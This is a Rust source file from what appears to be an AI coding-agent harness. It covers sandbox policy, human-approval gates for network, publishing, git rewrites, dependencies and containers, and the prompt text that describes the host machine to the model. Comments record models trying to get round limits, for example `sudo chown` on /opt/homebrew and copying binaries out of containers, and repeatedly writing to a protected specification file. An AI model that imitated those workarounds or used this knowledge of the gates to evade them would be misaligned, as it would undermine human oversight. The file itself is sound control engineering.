const TOOLCHAIN_BIN_DEPTH: usize = 4;

/// The shallowest `bin` directory under `directory`, breadth first, the
/// first by name at that depth.
fn shallowest_bin(directory: &Path) -> Option<PathBuf> {
    let mut level = vec![directory.to_path_buf()];
    for _ in 0..TOOLCHAIN_BIN_DEPTH {
        let mut next = Vec::new();
        for parent in &level {
            let Ok(entries) = std::fs::read_dir(parent) else {
                continue;
            };
            let mut children: Vec<PathBuf> = entries
                .flatten()
                .filter(|entry| entry.file_type().is_ok_and(|kind| kind.is_dir()))
                .map(|entry| entry.path())
                .collect();
            children.sort();
            next.extend(children);
        }
        if let Some(bin) = next
            .iter()
            .find(|path| path.file_name().is_some_and(|name| name == "bin"))
        {
            return Some(bin.clone());
        }
        level = next;
    }
    None
}

/// Whether a directory holds an executable file of its own.
fn has_executable(directory: &Path) -> bool {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::read_dir(directory).is_ok_and(|entries| {
            entries.flatten().any(|entry| {
                entry
                    .metadata()
                    .is_ok_and(|meta| meta.is_file() && meta.permissions().mode() & 0o111 != 0)
            })
        })
    }
    #[cfg(not(unix))]
    {
        let _ = directory;
        false
    }
}

/// The home of a JDK and a .NET installed in the workspace, for the tools
/// that look for them by variable rather than on PATH.
fn toolchain_homes(root: &Path) -> Vec<(&'static str, PathBuf)> {
    let mut homes = Vec::new();
    for path in toolchain_paths(root) {
        if path.join("javac").is_file()
            && !homes.iter().any(|(name, _)| *name == "JAVA_HOME")
            && let Some(home) = path.parent()
        {
            homes.push(("JAVA_HOME", home.to_path_buf()));
        }
        if path.join("dotnet").is_file() && !homes.iter().any(|(name, _)| *name == "DOTNET_ROOT") {
            homes.push(("DOTNET_ROOT", path.clone()));
        }
    }
    homes
}

/// The machine a run works on, in words a model can act on: what it is, what
/// it has, what it lacks, and how to get the rest.
pub fn host_facts(root: &Path) -> String {
    let os = match std::env::consts::OS {
        "macos" => "macOS",
        "linux" => "Linux",
        "windows" => "Windows",
        other => other,
    };
    let arch = std::env::consts::ARCH;
    let archive_names = match (std::env::consts::OS, arch) {
        ("macos", "aarch64") => {
            "darwin-arm64, macos-aarch64, mac-arm64, or a universal build (macos-universal)"
        }
        ("macos", "x86_64") => {
            "darwin-amd64, macos-x64, mac-x64, or a universal build (macos-universal)"
        }
        ("linux", "aarch64") => "linux-arm64 or linux-aarch64",
        ("linux", "x86_64") => "linux-amd64 or linux-x64",
        ("windows", "x86_64") => "windows-amd64 or win-x64",
        _ => "the ones for this operating system and architecture",
    };
    let mut search = toolchain_paths(root);
    if let Some(host) = std::env::var_os("PATH") {
        search.extend(std::env::split_paths(&host));
    }
    let on_path = |program: &str| {
        search
            .iter()
            .any(|directory| directory.join(program).is_file())
    };
    // macOS ships `java` and `javac` stubs that only say no Java is installed.
    let has_jdk = std::env::var_os("JAVA_HOME").is_some()
        || toolchain_paths(root)
            .iter()
            .any(|path| path.join("javac").is_file())
        || std::fs::read_dir("/Library/Java/JavaVirtualMachines")
            .map(|mut entries| entries.next().is_some())
            .unwrap_or(false)
        || Path::new("/opt/homebrew/opt/openjdk/bin/javac").is_file();
    let (mut present, mut missing) = (Vec::new(), Vec::new());
    for program in PROBED_PROGRAMS {
        let found = if matches!(*program, "java" | "javac") {
            has_jdk && on_path(program)
        } else {
            on_path(program)
        };
        if found {
            present.push(*program)
        } else {
            missing.push(*program)
        }
    }
    let docker = if !present.contains(&"docker") {
        "not installed"
    } else if std::env::var_os("HOME")
        .map(|home| Path::new(&home).join(".docker/run/docker.sock").exists())
        .unwrap_or(false)
        || Path::new("/var/run/docker.sock").exists()
    {
        "installed, and its daemon is running; the engineer is asked before a command uses \
         it, since containers run outside the sandbox. Before assuming what an image holds -- \
         its distribution, shell, package manager, users -- look: `docker run --rm \
         --entrypoint sh IMAGE -c 'cat /etc/os-release; cat /etc/passwd'`. Official images \
         often already have a non-root user to switch to (.NET: `USER $APP_UID`; Node: \
         `USER node`)"
    } else {
        "installed, but its daemon is not running"
    };
    present.sort_unstable();
    missing.sort_unstable();
    format!(
        "This machine: {os} on {arch}. Release archives built for it are usually named \
         {archive_names}.\n\
         Installed: {}.\n\
         Not installed: {}.\n\
         Docker: {docker}.\n\
         When the task needs a tool that is not installed, install it inside the workspace under \
         `{TOOLCHAINS_DIRECTORY}/<name>/` from its official release for this machine -- download \
         the archive with fetch_url and save_as, check its sha256, extract it there quietly (`unzip -q`, `tar -xzf` with no `v`: a list of every \
         file extracted fills the conversation and says nothing): every \
         `{TOOLCHAINS_DIRECTORY}/<name>/bin` is put on PATH for your commands and for the checks, \
         so a check that runs `go` or `javac` finds it. Nothing outside the workspace can be \
         written, so do not install system-wide. A program the workspace does not list, a \
         download and a published change go to the engineer for approval when you run them, \
         so run what the task needs rather than working around it; if one is refused, say \
         what it would have taken.{}",
        present.join(", "),
        if missing.is_empty() {
            "nothing checked for".to_owned()
        } else {
            missing.join(", ")
        },
        {
            let recipes = toolchain_recipes(root, &missing);
            if recipes.is_empty() {
                String::new()
            } else {
                format!(
                    "\nWhere to get what this workspace needs and the machine lacks:\n{}",
                    recipes
                        .iter()
                        .map(|recipe| format!("- {recipe}"))
                        .collect::<Vec<_>>()
                        .join("\n")
                )
            }
        },
    )
}

/// Files that say which toolchain a workspace is built with, and the
/// programs that toolchain is.
const TOOLCHAIN_MARKERS: &[(&str, &[&str])] = &[
    ("composer.json", &["php", "composer"]),
    ("pom.xml", &["java", "mvn"]),
    ("build.gradle", &["java", "gradle"]),
    ("build.gradle.kts", &["java", "gradle"]),
    ("settings.gradle.kts", &["java", "gradle"]),
    ("go.mod", &["go"]),
    ("Cargo.toml", &["cargo"]),
    ("package.json", &["node"]),
    ("global.json", &["dotnet"]),
    ("CMakeLists.txt", &["cmake"]),
    ("pubspec.yaml", &["dart"]),
    (".metadata", &["flutter"]),
    ("deno.json", &["deno"]),
    ("mix.exs", &["elixir"]),
];

/// The toolchains a workspace's own files name, looked for at its root and
/// two levels down (a .NET test project under `tests/`).
fn toolchains_named(root: &Path) -> Vec<&'static str> {
    let mut named: Vec<&'static str> = Vec::new();
    let mut level = vec![root.to_path_buf()];
    for _ in 0..3 {
        let mut next = Vec::new();
        for directory in &level {
            let Ok(entries) = std::fs::read_dir(directory) else {
                continue;
            };
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().into_owned();
                let path = entry.path();
                if path.is_dir() {
                    if !name.starts_with('.')
                        && !matches!(
                            name.as_str(),
                            "node_modules" | "vendor" | "target" | "build" | "dist" | "bin" | "obj"
                        )
                    {
                        next.push(path);
                    }
                    continue;
                }
                let programs: &[&'static str] = if name.ends_with(".csproj")
                    || name.ends_with(".sln")
                    || name.ends_with(".slnx")
                {
                    &["dotnet"]
                } else if name.ends_with(".tf") || name.ends_with(".tftest.hcl") {
                    &["terraform"]
                } else {
                    TOOLCHAIN_MARKERS
                        .iter()
                        .find(|(marker, _)| *marker == name)
                        .map(|(_, programs)| *programs)
                        .unwrap_or(&[])
                };
                for program in programs {
                    if !named.contains(program) {
                        named.push(program);
                    }
                }
            }
        }
        level = next;
    }
    named
}

/// How to get each toolchain the workspace names and the machine lacks,
/// from its official source, for this machine.
///
/// A local model knows that Go comes from go.dev; it does not reliably know
/// what the archive for this machine is called, that PHP has static builds
/// for macOS, or that a JDK's `bin` is under `Contents/Home`. Measured
/// 2026-09-26 on the stack matrix: guessing CMake's archive name cost twenty
/// actions, and with no PHP to be had the model built PHP from source, tried
/// Homebrew and `sudo chown` on `/opt/homebrew`, and copied a Linux binary out
/// of a container -- an hour, with the code already correct. Every address
/// here was checked to answer on the day it was written.
pub fn toolchain_recipes(root: &Path, missing: &[&str]) -> Vec<String> {
    let mac = std::env::consts::OS == "macos";
    let arm = std::env::consts::ARCH == "aarch64";
    let go_arch = match (mac, arm) {
        (true, true) => "darwin-arm64",
        (true, false) => "darwin-amd64",
        (false, true) => "linux-arm64",
        (false, false) => "linux-amd64",
    };
    let node_arch = match (mac, arm) {
        (true, true) => "darwin-arm64",
        (true, false) => "darwin-x64",
        (false, true) => "linux-arm64",
        (false, false) => "linux-x64",
    };
    let adoptium = match (mac, arm) {
        (true, true) => "mac/aarch64",
        (true, false) => "mac/x64",
        (false, true) => "linux/aarch64",
        (false, false) => "linux/x64",
    };
    let triple = match (mac, arm) {
        (true, true) => "aarch64-apple-darwin",
        (true, false) => "x86_64-apple-darwin",
        (false, true) => "aarch64-unknown-linux-gnu",
        (false, false) => "x86_64-unknown-linux-gnu",
    };
    let php_arch = match (mac, arm) {
        (true, true) => "macos-aarch64",
        (true, false) => "macos-x86_64",
        (false, true) => "linux-aarch64",
        (false, false) => "linux-x86_64",
    };
    let dart_arch = match (mac, arm) {
        (true, true) => "macos-arm64",
        (true, false) => "macos-x64",
        (false, true) => "linux-arm64",
        (false, false) => "linux-x64",
    };
    let cmake_archive = if mac {
        "cmake-3.31.6-macos-universal.tar.gz".to_owned()
    } else {
        format!(
            "cmake-3.31.6-linux-{}.tar.gz",
            if arm { "aarch64" } else { "x86_64" }
        )
    };
    let jdk_bin = if mac {
        " (its bin is under Contents/Home/bin)"
    } else {
        ""
    };
    let recipe = |program: &str| -> Option<String> {
        Some(match program {
            "go" => format!("go: https://go.dev/dl/go<version>.{go_arch}.tar.gz -- the versions are at https://go.dev/dl/?mode=json; extract into {TOOLCHAINS_DIRECTORY}/ (it unpacks as go/)."),
            "node" => format!("node: https://nodejs.org/dist/latest-v22.x/ lists node-v22.<x>.<y>-{node_arch}.tar.gz; extract into {TOOLCHAINS_DIRECTORY}/."),
            "java" => format!("java: https://api.adoptium.net/v3/binary/latest/21/ga/{adoptium}/jdk/hotspot/normal/eclipse is a JDK 21 .tar.gz; extract into {TOOLCHAINS_DIRECTORY}/{jdk_bin}."),
            "mvn" => format!("mvn: https://archive.apache.org/dist/maven/maven-3/3.9.9/binaries/apache-maven-3.9.9-bin.tar.gz; extract into {TOOLCHAINS_DIRECTORY}/ (it needs a JDK)."),
            "gradle" => format!("gradle: https://services.gradle.org/distributions/gradle-8.14-bin.zip; unzip into {TOOLCHAINS_DIRECTORY}/ (it needs a JDK)."),
            "dotnet" => format!("dotnet: save https://dot.net/v1/dotnet-install.sh and run `bash dotnet-install.sh --channel 10.0 --install-dir {TOOLCHAINS_DIRECTORY}/dotnet`."),
            "cmake" => format!("cmake: https://github.com/Kitware/CMake/releases/download/v3.31.6/{cmake_archive}; extract into {TOOLCHAINS_DIRECTORY}/."),
            "php" => format!("php: static builds need nothing else -- https://dl.static-php.dev/static-php-cli/common/ lists php-<version>-cli-{php_arch}.tar.gz, one `php` binary; put it in {TOOLCHAINS_DIRECTORY}/php/bin/ and make it executable."),
            "composer" => format!("composer: https://getcomposer.org/download/latest-stable/composer.phar; save it as {TOOLCHAINS_DIRECTORY}/composer/bin/composer and make it executable (it runs with php)."),
            "dart" => format!("dart: https://storage.googleapis.com/dart-archive/channels/stable/release/latest/sdk/dartsdk-{dart_arch}-release.zip; unzip into {TOOLCHAINS_DIRECTORY}/ (it unpacks as dart-sdk/)."),
            "flutter" => format!("flutter: {} lists every release -- base_url + archive of the current stable one for this machine ({}); unzip into {TOOLCHAINS_DIRECTORY}/ (it unpacks as flutter/, with dart inside).", if mac { "https://storage.googleapis.com/flutter_infra_release/releases/releases_macos.json" } else { "https://storage.googleapis.com/flutter_infra_release/releases/releases_linux.json" }, if mac && arm { "flutter_macos_arm64_<version>-stable.zip" } else if mac { "flutter_macos_<version>-stable.zip" } else { "flutter_linux_<version>-stable.tar.xz" }),
            "deno" => format!("deno: https://github.com/denoland/deno/releases/latest/download/deno-{triple}.zip; unzip into {TOOLCHAINS_DIRECTORY}/deno/bin/."),
            "cargo" => format!("cargo: https://static.rust-lang.org/rustup/dist/{triple}/rustup-init; run it with RUSTUP_HOME={TOOLCHAINS_DIRECTORY}/rust/rustup and CARGO_HOME={TOOLCHAINS_DIRECTORY}/rust/cargo: `rustup-init -y --no-modify-path --profile minimal`."),
            "terraform" => format!("terraform: https://releases.hashicorp.com/terraform/ lists the versions; download terraform_<version>_{}.zip and unzip into {TOOLCHAINS_DIRECTORY}/terraform/bin/.", go_arch.replace('-', "_")),
            // Checked 2026-09-26: both archives run from any folder, and
            // `mix test` on a project without dependencies writes nothing
            // outside it. Docker is no substitute on a Mac: the checks run
            // `mix` on the host.
            "elixir" if mac => format!("elixir: Erlang first -- https://github.com/erlef/otp_builds/releases/download/OTP-28.5.0.7/OTP-28.5.0.7-macos-{}.tar.gz, extracted into {TOOLCHAINS_DIRECTORY}/erlang/ (it has bin/erl); then https://github.com/elixir-lang/elixir/releases/download/v1.20.4/elixir-otp-28.zip, unzipped into {TOOLCHAINS_DIRECTORY}/elixir/ (it has bin/mix). Both run where they are extracted.", if arm { "arm64" } else { "amd64" }),
            "elixir" => "elixir: run it in its Docker image (`docker run --rm -v \"$PWD\":/w -w /w elixir:1.18 mix test`), with the engineer's approval for the container engine.".to_owned(),
            _ => return None,
        })
    };
    let mut recipes: Vec<String> = toolchains_named(root)
        .into_iter()
        .filter(|program| {
            missing.contains(program) || (*program == "java" && missing.contains(&"javac"))
        })
        .filter_map(recipe)
        .collect();
    if !recipes.is_empty() {
        recipes.push(
            "anything with an official Docker image can also run in a container \
             (`docker run --rm -v \"$PWD\":/w -w /w <image> <command>`), with the engineer's approval."
                .to_owned(),
        );
    }
    recipes
}

/// Dependency manifests and lockfiles. Editing one changes what the build
/// fetches and executes, so it is an approval gate rather than a plain edit.
const DEPENDENCY_MANIFESTS: [&str; 12] = [
    "Cargo.toml",
    "Cargo.lock",
    "package.json",
    "package-lock.json",
    "yarn.lock",
    "pnpm-lock.yaml",
    "requirements.txt",
    "pyproject.toml",
    "poetry.lock",
    "go.mod",
    "go.sum",
    "Gemfile",
];

/// Git subcommands and flags that discard or rewrite recorded history.
const HISTORY_REWRITE_ARGS: [&str; 6] = [
    "rebase",
    "filter-branch",
    "filter-repo",
    "--force",
    "-f",
    "--amend",
];

/// See [`ToolPolicy::refuse_if_protected`]: the paths a model may read but
/// never write, because something outside the sandbox acts on them.
fn refuse_if_runs_outside(normalized: &Path) -> Result<(), ToolError> {
    let parts: Vec<String> = normalized
        .components()
        .filter_map(|component| match component {
            Component::Normal(name) => Some(name.to_string_lossy().to_lowercase()),
            _ => None,
        })
        .collect();
    if parts.first().is_some_and(|first| first == STATE_DIRECTORY) {
        return Err(ToolError::Denied(format!(
            "{} is PWR's own state -- its records, and the checks and protections this run is \
             held to -- so it can be read but not changed. Put the work in the project's own files.",
            normalized.display()
        )));
    }
    let in_git = parts
        .iter()
        .position(|part| part == ".git")
        .is_some_and(|git| {
            let inside = &parts[git + 1..];
            inside.iter().any(|part| part == "hooks")
                || inside.last().is_some_and(|last| last == "config")
        });
    if in_git {
        return Err(ToolError::Denied(format!(
            "{} is run by git itself, with the person's rights and outside the sandbox, the next \
             time anyone uses git here, and it never shows in the changes they review -- so it \
             cannot be changed. Commits, branches and the rest of git work as usual through \
             run_command.",
            normalized.display()
        )));
    }
    Ok(())
}

/// Returns the approval a proposed command requires, if any.
pub fn command_approval(executable: &str, args: &[String]) -> Option<Approval> {
    // Use the same argv normalization as execution and network detection.
    let args = args_after_program(executable, args).unwrap_or(args);
    let name = Path::new(executable)
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| executable.to_string());
    // `dotnet publish` builds a deployable folder on this machine and sends
    // nothing anywhere -- `dotnet nuget push` is .NET's publish. Asked about as
    // a publish, it was refused on the stack matrix (2026-09-26) and the model,
    // unable to build its image's output, started rewriting a working API.
    let local_build = name == "dotnet" && args.first().is_some_and(|first| first == "publish");
    if args.iter().any(|arg| arg == "publish") && !local_build {
        return Some(Approval::Publish);
    }
    if name == "dotnet"
        && args
            .windows(2)
            .any(|pair| pair[0] == "nuget" && pair[1] == "push")
    {
        return Some(Approval::Publish);
    }
    // An image pushed to a registry is published as surely as a package is.
    if CONTAINER_CLIENTS.contains(&name.as_str()) && args.iter().any(|arg| arg == "push") {
        return Some(Approval::Publish);
    }
    if name == "git" {
        if args.iter().any(|arg| arg == "push") {
            return Some(Approval::Publish);
        }
        if args
            .iter()
            .any(|arg| HISTORY_REWRITE_ARGS.contains(&arg.as_str()))
        {
            return Some(Approval::HistoryRewrite);
        }
        // Both of these discard uncommitted work, which is the agent's own
        // output as often as the user's. The comment here used to name `clean`
        // while only `reset` was checked, so the destructive half nobody had
        // written down was the one that ran.
        if args.iter().any(|arg| arg == "reset") && args.iter().any(|arg| arg == "--hard") {
            return Some(Approval::HistoryRewrite);
        }
        if args.iter().any(|arg| arg == "clean") {
            return Some(Approval::HistoryRewrite);
        }
    }
    // The installed tree is read-only without this grant. A plain install
    // need not edit a manifest first: the rollback battery's `npm install`
    // reached EPERM on node_modules without ever asking the owner about it.
    // Builds and tests keep their normal policy; this is the explicit package
    // operation, not every command that might fetch a dependency.
    let first = args.first().map(String::as_str).unwrap_or_default();
    let dependency_change = match name.as_str() {
        "npm" | "pnpm" | "yarn" | "bun" => {
            (name == "yarn" && first.is_empty())
                || matches!(
                    first,
                    "install"
                        | "i"
                        | "ci"
                        | "add"
                        | "update"
                        | "upgrade"
                        | "up"
                        | "uninstall"
                        | "remove"
                        | "rm"
                        | "dedupe"
                        | "prune"
                        | "rebuild"
                )
        }
        "composer" => matches!(first, "install" | "update" | "require" | "remove"),
        _ => false,
    };
    dependency_change.then_some(Approval::DependencyChange)
}

/// Kept separate from `required_approval` so an installer explicitly outside
/// the sandbox asks for both rights. An outside-sandbox grant alone does not
/// authorize changes to the dependency tree.
pub fn dependency_install_approval(action: &ActionProposal) -> Option<(Approval, String)> {
    let (ActionProposal::RunCommand {
        executable, args, ..
    }
    | ActionProposal::StartService {
        executable, args, ..
    }) = action
    else {
        return None;
    };
    (command_approval(executable, args) == Some(Approval::DependencyChange)).then(|| {
        (
            Approval::DependencyChange,
            format!(
                "install or change dependencies with `{}`",
                command_line(executable, args)
            ),
        )
    })
}

/// A command that names a URL, and the network grant it will need.
///
/// `run_command_in` refuses one outright without the grant, which left the
/// model told "requires an explicit grant" with nobody it could ask for it.
/// Asked before it runs instead, like any other approval.
/// `base` joined with `relative`, `..` and `.` folded away without touching
/// the filesystem.
fn lexical_join(base: &Path, relative: &Path) -> PathBuf {
    let mut out = if relative.is_absolute() {
        PathBuf::new()
    } else {
        base.to_path_buf()
    };
    for component in relative.components() {
        match component {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            other => out.push(other),
        }
    }
    out
}

/// An absolute path with its deepest existing ancestor canonicalised, so a
/// link on the way is where it leads.
fn resolve_existing_ancestor(path: &Path) -> Result<PathBuf, ToolError> {
    let mut existing = path;
    let mut trailing = Vec::new();
    while std::fs::symlink_metadata(existing).is_err() {
        trailing.push(
            existing
                .file_name()
                .ok_or_else(|| ToolError::Denied("target has no file name".into()))?
                .to_owned(),
        );
        existing = existing
            .parent()
            .ok_or_else(|| ToolError::Denied("target has no parent".into()))?;
    }
    let mut resolved = existing
        .canonicalize()
        .map_err(|_| ToolError::Denied("target parent is unavailable".into()))?;
    for component in trailing.iter().rev() {
        resolved.push(component);
    }
    Ok(resolved)
}

/// What an action reaches outside the workspace, if anything, as the question
/// a person answers: the operation and the exact path. Subfolders never ask;
/// neither does a declared reference folder, which is readable already.
pub fn leaves_workspace(
    action: &ActionProposal,
    policy: &ToolPolicy,
) -> Option<(Approval, String)> {
    let reached: Vec<(&str, &str)> = match action {
        ActionProposal::ReadFile { path, .. } | ActionProposal::ExtractDocument { path } => {
            vec![("read", path)]
        }
        ActionProposal::ListTree {
            path: Some(path), ..
        } => vec![("list", path)],
        ActionProposal::WriteFile { path, .. }
        | ActionProposal::ApplyReplace { path, .. }
        | ActionProposal::ReplaceText { path, .. }
        | ActionProposal::ApplyPatchHunks { path, .. }
        | ActionProposal::RestoreFile { path }
        | ActionProposal::MakeDirectory { path } => vec![("write", path)],
        ActionProposal::DeletePath { path, .. } => vec![("delete", path)],
        ActionProposal::MovePath { from, to } => vec![("move", from), ("move to", to)],
        ActionProposal::RunCommand { cwd: Some(cwd), .. } => vec![("run a command in", cwd)],
        _ => Vec::new(),
    };
    let outside: Vec<String> = reached
        .into_iter()
        .filter(|(_, path)| policy.leaves_root(Path::new(path)))
        .map(|(verb, path)| format!("{verb} {path}"))
        .collect();
    (!outside.is_empty()).then(|| {
        (
            Approval::OutsideWorkspace,
            format!("{}, outside the workspace", outside.join(" and ")),
        )
    })
}

pub fn names_a_url(action: &ActionProposal, policy: &ToolPolicy) -> Option<(Approval, String)> {
    let (ActionProposal::RunCommand {
        executable, args, ..
    }
    | ActionProposal::StartService {
        executable, args, ..
    }) = action
    else {
        return None;
    };
    (!policy.network_allowed()
        && args
            .iter()
            .any(|arg| arg.contains("http://") || arg.contains("https://")))
    .then(|| {
        (
            Approval::NetworkAccess,
            format!("let `{}` reach the network", command_line(executable, args)),
        )
    })
}

/// An install that will run in the offline sandbox, and the network it needs.
///
/// A build may or may not reach the network, so it runs first and is asked
/// only if the sandbox's refusal shows (`withheld`). An install that changes
/// the dependency tree always fetches: measured 2026-10-02 (react-datatable,
/// gemma-4-12B), `npm install` was approved as a dependency change, then ran
/// offline for its whole 120 s, failed, and only then was the network asked
/// for -- two minutes and a failed action for an answer known beforehand.
pub fn install_needs_network(
    action: &ActionProposal,
    policy: &ToolPolicy,
) -> Option<(Approval, String)> {
    // Outside the sandbox nothing withholds the network.
    let (executable, args) = match action {
        ActionProposal::RunCommand {
            executable,
            args,
            outside_sandbox: false,
            ..
        }
        | ActionProposal::StartService {
            executable, args, ..
        } => (executable, args),
        _ => return None,
    };
    (!policy.network_allowed()
        && policy.will_sandbox().unwrap_or(false)
        && command_approval(executable, args) == Some(Approval::DependencyChange)
        && fetches_dependencies(executable, args))
    .then(|| {
        (
            Approval::NetworkAccess,
            format!(
                "let `{}` reach the network to download what it installs",
                command_line(executable, args)
            ),
        )
    })
}

/// A command that drives the container engine, and the grant it needs.
pub fn drives_containers(
    action: &ActionProposal,
    policy: &ToolPolicy,
) -> Option<(Approval, String)> {
    let (ActionProposal::RunCommand {
        executable, args, ..
    }
    | ActionProposal::StartService {
        executable, args, ..
    }) = action
    else {
        return None;
    };
    (is_container_client(executable) && !policy.approvals.contains(&Approval::ContainerEngine))
        .then(|| {
            (
                Approval::ContainerEngine,
                container_engine_question(executable, args),
            )
        })
}

/// What a person is asked before a command reaches the container engine.
pub fn container_engine_question(executable: &str, args: &[String]) -> String {
    format!(
        "let `{}` use the container engine -- containers run outside PWR's sandbox, can reach \
         the network and can mount folders the engine shares",
        command_line(executable, args)
    )
}

/// The program an action would run that this policy does not permit, with the
/// approval that would permit it and a description a person can judge.
///
/// The workspace's list of programs is where a run starts, not where it must
/// stop: a task can need `docker`, `curl`, `javac` or a shell the repository
/// never declared. So a program outside the list is a question for the person
/// -- the one [`Approval::ToolchainInstall`] answers -- rather than a refusal
/// nobody was asked about. The sandbox confines whatever runs either way.
pub fn unlisted_program(
    action: &ActionProposal,
    policy: &ToolPolicy,
) -> Option<(Approval, String)> {
    let (executable, args, stdin) = match action {
        ActionProposal::RunCommand {
            executable,
            args,
            stdin,
            ..
        } => (executable, args, stdin.as_deref()),
        ActionProposal::StartService {
            executable, args, ..
        } => (executable, args, None),
        _ => return None,
    };
    if executable.trim().is_empty() || policy.permits_program(executable) {
        return None;
    }
    // A script read from stdin is what a shell will run, and the person is
    // being asked about it: seen 2026-09-27, `sh test -- x_ranges` was asked
    // while the script, `cargo test --test ranges`, went unshown.
    let script = stdin
        .map(str::trim)
        .filter(|script| !script.is_empty())
        .map(|script| {
            let shown: String = script.chars().take(300).collect();
            let more = if shown.len() < script.len() {
                " ..."
            } else {
                ""
            };
            format!(", reading the script `{shown}{more}`")
        })
        .unwrap_or_default();
    let listed = if policy.allow_commands.is_empty() {
        "it declares none".to_owned()
    } else {
        format!("it declares {}", policy.allow_commands.join(", "))
    };
    Some((
        Approval::ToolchainInstall,
        format!(
            "run `{}`{script} -- `{executable}` is not one of this workspace's programs ({listed})",
            command_line(executable, args)
        ),
    ))
}

/// The tool that does what a command-line utility was asked to do, when there
/// is one: said to a model whose command was refused, so that it does not
/// spend its next actions asking again for another utility.
///
/// Counted over the product-path runs of 2026-10-06/07 (pwr-evidence, three
/// models): of 48 requests to run a program the workspace does not declare,
/// 23 were `ls`, `find`, `cat` or `wc` -- each a question put to the person
/// for something `list_tree`, `read_file` or `search` does with no question.
pub fn tool_instead_of(executable: &str) -> Option<&'static str> {
    let name = executable.rsplit('/').next().unwrap_or(executable);
    Some(match name {
        "ls" | "find" | "tree" | "dir" => "list_tree lists a folder",
        "cat" | "head" | "tail" | "less" | "more" | "wc" | "nl" => {
            "read_file reads a file, whole or a window of it"
        }
        "grep" | "rg" | "ag" | "ack" => "search finds text in the workspace",
        _ => return None,
    })
}

/// What an action requires, and a description a person can judge.
///
/// One place, so the loop can ask before acting rather than each tool
/// discovering its own gate at the moment it would have acted.
pub fn required_approval(action: &ActionProposal) -> Option<(Approval, String)> {
    match action {
        ActionProposal::FetchUrl { url, save_as } => Some((
            Approval::NetworkAccess,
            match save_as {
                Some(path) => format!("download {url} into {path}"),
                None => format!("fetch {url}"),
            },
        )),
        ActionProposal::RunCommand {
            executable,
            args,
            outside_sandbox: true,
            ..
        } => Some((
            Approval::OutsideSandbox,
            format!(
                "run `{}` outside the sandbox, with your full rights",
                command_line(executable, args)
            ),
        )),
        ActionProposal::RunCommand {
            executable, args, ..
        } => command_approval(executable, args).map(|approval| {
            (
                approval,
                format!("run `{}`", command_line(executable, args)),
            )
        }),
        ActionProposal::ApplyReplace { path, .. } | ActionProposal::WriteFile { path, .. } => {
            edit_approval(Path::new(path)).map(|a| (a, format!("write {path}")))
        }
        ActionProposal::RestoreFile { path } => edit_approval(Path::new(path))
            .map(|a| (a, format!("restore {path} to how the run found it"))),
        ActionProposal::ReplaceText { path, find, .. } => edit_approval(Path::new(path))
            .map(|a| (a, format!("change {path} where it reads `{}`", elide(find)))),
        ActionProposal::ProposeVerifier {
            executable,
            args,
            rationale,
        } => Some((
            Approval::VerifierProposal,
            format!(
                "adopt `{executable} {}` as this workspace's verifier — {}",
                args.join(" "),
                elide(rationale)
            ),
        )),
        _ => None,
    }
}

/// Shortens a fragment for a prompt without hiding what it is.
fn elide(text: &str) -> String {
    let single_line = text.replace('\n', " ");
    if single_line.chars().count() <= 60 {
        return single_line;
    }
    format!("{}…", single_line.chars().take(59).collect::<String>())
}

/// Returns the approval editing `relative` requires, if any.
pub fn edit_approval(relative: &Path) -> Option<Approval> {
    let name = relative.file_name()?.to_string_lossy().to_string();
    DEPENDENCY_MANIFESTS
        .contains(&name.as_str())
        .then_some(Approval::DependencyChange)
}

#[derive(Debug, Clone)]
pub struct ToolPolicy {
    pub root: PathBuf,
    /// Paths outside the root a command may read, named by whoever built the
    /// policy.
    ///
    /// Empty for a task: an agent working in a repository has no business
    /// reading elsewhere. Corpus preparation is the case that needs it, and
    /// only for the source the corpus itself declares -- a local mirror it was
    /// told to clone from. Naming it here rather than widening the profile
    /// keeps the exception to exactly what was declared.
    pub extra_readable: Vec<PathBuf>,
    /// Paths this task may read but must never change.
    ///
    /// A specification and its acceptance tests are the question being asked.
    /// Nothing stopped a deployment from rewriting them: prose in the task said
    /// they were frozen, and prose is not a guard. Measured on an 80B building
    /// an Angular site: it fixed on the path of the last file it had read and
    /// sent twelve `write_file` calls at `SPECIFICATION.md`, each carrying the
    /// correct contents of a source file that did not exist yet. Only the
    /// generic "file exists" refusal stood in the way -- and that refusal
    /// explains how to overwrite the file, which is the opposite of what a
    /// caller aiming at the wrong path needs to hear.
    ///
    /// Empty by default: a workspace that declares nothing protects nothing.
    pub protected: Vec<PathBuf>,
    pub allow_commands: Vec<String>,
    pub output_limit: usize,
    pub timeout: Duration,
    pub sandbox: SandboxPolicy,
    /// Approvals the user has explicitly granted for this run.
    pub approvals: Vec<Approval>,
}
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum PolicyProfile {
    Safe,
    Development,
}
impl PolicyProfile {
    pub fn build(self, root: PathBuf) -> ToolPolicy {
        let allow_commands = match self {
            Self::Safe => vec![],
            Self::Development => vec!["cargo".into(), "git".into(), "rg".into()],
        };
        ToolPolicy {
            root,
            extra_readable: Vec::new(),
            protected: Vec::new(),
            allow_commands,
            output_limit: 64 * 1024,
            timeout: Duration::from_secs(120),
            sandbox: SandboxPolicy::Preferred,
            // Nothing beyond the workspace is authorised until a user says so.
            approvals: Vec::new(),
        }
    }
}
/// Whether the person opted out of the sandbox refusal (`PWR_ALLOW_UNCONFINED=1`).
fn unconfined_allowed() -> bool {
    std::env::var("PWR_ALLOW_UNCONFINED").ok().as_deref() == Some("1")
}

impl ToolPolicy {
    /// Why a path outside the workspace was refused, and what was probably
    /// meant. Seen 2026-09-19 (catalogue, Nemotron 3.5 on suite A4): a model
    /// writing `/slugify.py` for the workspace's `slugify.py` was told only
    /// "path escapes workspace root", tried eight edits that way, then went
    /// looking for the workspace under /private. The path is still refused --
    /// an absolute path is not reinterpreted -- but the refusal names the
    /// relative path when that file exists.
    fn escape_refusal(&self, relative: &Path) -> String {
        let stripped: PathBuf = relative
            .components()
            .filter(|c| matches!(c, Component::Normal(_)))
            .collect();
        let inside = self.root.join(&stripped);
        if relative.is_absolute() && !stripped.as_os_str().is_empty() && inside.exists() {
            format!(
                "{} is outside the workspace: paths are relative to the workspace root. \
                 Did you mean {}? It exists.",
                relative.display(),
                stripped.display()
            )
        } else if let Some(reference) = self.reference_containing(relative) {
            // Seen 2026-09-22 (Nemotron 3.5, web_pwr): the project folder
